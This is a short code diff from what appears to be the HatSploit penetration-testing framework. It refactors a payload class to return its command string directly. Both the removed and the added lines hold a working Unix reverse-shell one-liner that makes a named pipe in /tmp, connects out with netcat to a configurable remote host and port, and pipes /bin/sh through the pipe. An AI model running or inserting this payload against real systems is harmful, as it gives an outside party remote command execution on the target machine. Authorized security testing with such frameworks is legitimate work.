@@ -29,6 +29,4 @@ class HatSploitPayload(Payload, String):
         remote_port = self.handler['RPORT']
 
         filename = self.random_string(8)
-        payload = f"mkfifo /tmp/{filename}; nc {remote_host} {remote_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
-
-        return payload
+        return f"mkfifo /tmp/{filename}; nc {remote_host} {remote_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
